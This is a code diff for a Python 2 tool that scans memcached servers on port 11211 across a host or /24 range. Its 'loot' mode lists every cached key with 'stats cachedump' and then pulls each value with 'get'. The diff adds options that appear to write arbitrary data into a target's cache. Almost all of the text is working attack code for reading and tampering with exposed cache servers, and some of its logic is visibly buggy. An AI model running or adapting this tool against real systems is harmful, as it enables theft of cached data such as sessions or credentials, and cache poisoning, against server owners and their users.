@@ -18,6 +18,8 @@ def cmd():
 	parser.add_argument('-t','--target', required=True, help='Specify target. It can be single host, or range of hosts, separated by hyphen. For now, only /24 net will scan n')
 	parser.add_argument('-p','--port', default ="11211", help='Specify target port. By default 11211 is used\n')
 	parser.add_argument('-m','--mode', default = mode_info, choices=LOOTMODE, help='Specify working mode. By default it tries to read all the possible data')
+	parser.add_argument('-k','--key', default = None, help='Key to write data to')
+	parser.add_argument('-v','--value', default = None, help='Data to write to specified key')
 	parser.add_argument('-o','--output', help='File to write the output')
 
 	args= parser.parse_args()
@@ -25,6 +27,8 @@ def cmd():
 	#Parse & Check target host
 	target = args.target
 	port = args.port
+	key = args.key
+	value = args.value
 	try:
 		int(port[1])
 	except ValueError:
@@ -56,9 +60,29 @@ def cmd():
 					print "[-]Incorrect ip address: %s"%(ip)
 					sys.exit(-1)
 				ipList.append(ip)
-	print "[!] Will %s %s on port %s\n\n" % (mode, target, port)
+	print "[!] Working mode: %s" % (mode)
+	print "[!] Target host(s): %s" % (target)
+	print "[!] Target port: %s" % (port)
+	return (ipList,int(port),mode,key,value,output)
 
-	return (ipList,int(port),mode,output)
+
+def parse_key(resp):
+	key = None
+	value = None
+	resp_list = resp.split("\r\n")
+	try:
+		key = resp_list[0].split(" ")[1]
+		value = resp_list[1]
+	except:
+		return None,None
+	return key,value
+
+def parse_stat(resp):
+	# [:-2] Because of END\r\n line
+	resp_list = resp.split("\r\n")[:-2]
+	return [x.strip("STAT ").split(" ") for x in resp_list]
+
+
 
 
 if __name__ == "__main__":
@@ -69,45 +93,51 @@ if __name__ == "__main__":
 		try:
 			f = open(output,'w+')
 		except Exception:
-			print "[-] Filename is not valid: %s" % (output)
+			print "\t[-] Filename is not valid: %s" % (output)
 			sys.exit(-1)
 	if mode == mode_info:
 		for ip in ipList:
-			print "[!] Getting info on MemCache from %s" % ip
-			if toFile: f.write("\r\n%s\r\n\r\n" % ip)
+			print "\t[!] Getting info on MemCache from %s" % ip
+			if toFile: f.write("\r\n[!] %s\r\n" % ip)
 			s = socket.socket()
 			s.connect((ip,port))
-			#First of all, we try to get all stored keys from memcached service
-			#TODO: Make proper list of commands somewhere in global
-			s.send("stats \r\n")
+			#Dumb retrieval of memcached statistic
+			#stat - Command to retrieve statistic
+			mc_cmd = "stats\r\n"
+			s.send(mc_cmd)
 			resp = s.recv(4096)
+			parse_stat(resp)
 			if toFile: 
-				f.write("STATISTIC:\r\n")
-				f.write("%s\r\n" % resp)
+				f.write("[!] Stats:\r\n")
+				for line in parse_stat(resp):
+					f.write("\t[+] %s : %s\r\n" % (line[0], line[1]))
+				f.close()
 			#Second, we try to read value for each found key
 			s.close()
-			if toFile: f.close()
 	if mode == mode_loot:
 		keys = []
 		for ip in ipList:
-			print "[!] Looting MemCache from %s" % ip
-			if toFile: f.write("\r\n%s\r\n\r\n" % ip)
+			print "\t[!] Looting MemCached on %s" % ip
+			if toFile: f.write("\r\n[!] %s\r\n" % ip)
 			s = socket.socket()
 			s.connect((ip,port))
 			#First of all, we try to get all stored keys from memcached service
-			s.send("stats cachedump 1 0\r\n")
+			#stats cachedump - command for retrieving all the cached keys
+			mc_cmd = "stats cachedump 1 0\r\n"
+			s.send(mc_cmd)
 			resp = ""
 			resp = s.recv(1024)
 			#Here we truncate the last two items because of END singnature
 			for item in resp.split("\r\n")[:-2]:
 				keys.append(item.split(" ")[1])
-			print "\t[+]Found %d items: %s" % (len(keys), ', '.join((keys)))
+			print "\t\t[+]Found %d items: %s" % (len(keys), ', '.join((keys)))
 			#Second, we try to read value for each found key
 			for key in keys:
+				#get - command to retrieve specified's key value
 				mc_cmd = "get %s\r\n" % (key)
 				s.send(mc_cmd)
 				resp = s.recv(1024)
-				if toFile: f.write("%s\r\n" % resp)
+				if toFile: f.write("\t[+] %s : %s\r\n" % (parse_key(resp)))
 			s.close()
 			if toFile: f.close()
 
